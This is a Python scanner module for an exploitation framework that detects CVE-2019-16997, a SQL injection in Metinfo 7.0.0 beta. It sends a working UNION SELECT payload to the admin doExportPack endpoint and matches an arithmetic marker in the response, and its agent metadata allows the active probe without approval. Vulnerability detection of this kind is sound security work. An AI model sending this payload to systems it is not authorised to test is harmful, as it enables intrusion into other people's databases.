#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Metinfo 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Metinfo 7.0.0 beta - SQL Injection Detection',
        'description': 'Metinfo 7.0.0 beta is susceptible to SQL Injection in app/system/language/admin/language_general.class.php via the admin/?n=language&c=language_general&a=doExportPack appno parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'metinfo', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/XiaOkuoAi/XiaOkuoAi.github.io/issues/2',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-16997',
            'https://github.com/jweny/pocassistdb',
            'https://github.com/zhibx/fscan-Intranet',
            'https://github.com/0ps/pocassistdb',
        ],
        'cve': 'CVE-2019-16997',
    }

    def run(self):
        path = '/admin/?n=language&c=language_general&a=doExportPack'
        r = self.http_request(method='POST', path=path, allow_redirects=True, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='appno= 1 union SELECT 98989*443131,1&editor=cn&site=web\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('43865094559',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Metinfo 7.0.0 beta - SQL Injection detected', path=path)
            return True
        return False

